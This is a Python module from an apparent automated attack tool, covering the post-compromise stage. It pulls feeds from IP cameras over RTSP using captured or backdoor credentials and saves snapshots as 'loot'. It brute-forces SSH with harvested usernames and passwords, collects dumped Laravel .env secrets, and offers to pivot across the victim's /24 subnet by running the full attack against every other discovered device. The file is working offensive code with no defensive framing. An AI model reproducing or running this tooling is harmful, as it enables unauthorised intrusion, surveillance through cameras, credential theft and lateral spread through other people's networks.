"""Post-attack: RTSP, SSH, pivot, loot summary."""

from __future__ import annotations

import os
import webbrowser

from engines.auto_pwn.session import AttackSession
from engines.camera_viewer import CameraViewer
from engines.loot_report import LootEntry
from engines.ssh_engine import SSHEngine
from engines.utils import log, save_success


def finalize_attack(session: AttackSession) -> None:
    ip = session.ip
    loot = session.loot
    scanner = session.scanner
    manual_mode = session.manual_mode

    rtsp_ports = scanner.discover_rtsp_ports(ip)
    if rtsp_ports:
        log(f"RTSP port(s) open: {rtsp_ports}. Trying camera streams...", "INFO")
        use_backdoor = "11" in session.all_passwords and not any(e.has_credentials for e in loot.entries)
        best = loot.best_entry()
        cam_user = best.username if best else session.all_users[0]
        cam_pass = best.password if best else session.all_passwords[0]
        cam = CameraViewer(ip, cam_user, cam_pass, use_backdoor_auth=use_backdoor)
        cam.discover_channels()
        for p in cam.take_snapshots():
            loot.add_file(p)
        cam.open_in_vlc(use_sub_stream=True)

    ssh_ports = scanner.discover_ssh_ports(ip)
    if ssh_ports:
        log("SSH Phase: Trying all discovered credentials across all ports...", "PWN")
        users = list(set(session.all_users))
        passwords = list(set(session.all_passwords))
        for sp in ssh_ports:
            if SSHEngine(ip, port=sp).brute_force(users, passwords):
                loot.add(LootEntry(
                    ip=ip, port=sp, device_type="SSH",
                    username=users[0], password="(discovered)",
                    auth_method="SSH brute-force",
                ))
                save_success(ip, f"SSH ({sp})", "Discovered Creds")
                break
        else:
            log("SSH brute-force did not succeed.", "INFO")

    env_file = f"targets/{ip}/env_backup.txt"
    if os.path.exists(env_file):
        loot.add_file(env_file)
        loot.add_note("Laravel .env secrets dumped")

    loot.print_final()
    _offer_pivot(session)

    log("--- ALL TASKS COMPLETED ---", "SUCCESS")
    if session.open_ports and not manual_mode:
        try:
            webbrowser.open(f"http://{ip}:{session.open_ports[0]}")
        except Exception:
            pass


def _offer_pivot(session: AttackSession) -> None:
    if session.manual_mode:
        return
    if not (session.router_pwned or session.camera_handled or any(e.has_credentials for e in session.loot.entries)):
        return

    ip = session.ip
    print("\n" + "=" * 50)
    print("   PIVOT ATTACK (LATERAL MOVEMENT) AVAILABLE")
    print("=" * 50)
    log(
        f"Device {ip} compromised. Pivot to other hosts on {ip}/24?",
        "WARNING",
    )
    if input("\n[?] Discover and attack other devices on this subnet? (y/n): ").strip().lower() != "y":
        return

    from engines.auto_pwn.runner import main as run_auto_pwn
    from engines.pivot_scanner import PivotScanner

    pivot = PivotScanner(ip)
    pivot.discover_subnet_devices()
    devices = pivot.classify_devices()
    if not devices:
        return

    print("\n" + "-" * 45)
    print(f"  DEVICES DISCOVERED ON {pivot.subnet}")
    print("-" * 45)
    for i, dev in enumerate(devices):
        print(
            f"  [{i + 1}] IP: {dev['ip']:<15} | MAC: {dev.get('mac', 'N/A'):<17} | "
            f"Type: {dev.get('type', '?'):<15} | Vendor: {dev.get('vendor', '')}"
        )
    print("  [A] Attack ALL Devices")
    print("  [Q] Quit / Don't Pivot")
    print("-" * 45)

    pivot_choice = input("\n[?] Select Device ID, 'A' for All, or 'Q' to quit: ").strip().upper()
    targets: list[str] = []
    if pivot_choice == "A":
        targets = [d["ip"] for d in devices if d["ip"] != ip]
    elif pivot_choice.isdigit():
        idx = int(pivot_choice) - 1
        if 0 <= idx < len(devices):
            target_ip = devices[idx]["ip"]
            if target_ip != ip:
                targets = [target_ip]
            else:
                log("You selected the device you just hacked. Skipping.", "WARNING")

    for pivot_ip in targets:
        log(f"\n>>> INITIATING PIVOT ATTACK ON {pivot_ip} <<<", "PWN")
        run_auto_pwn(f"http://{pivot_ip}", manual_mode=False)
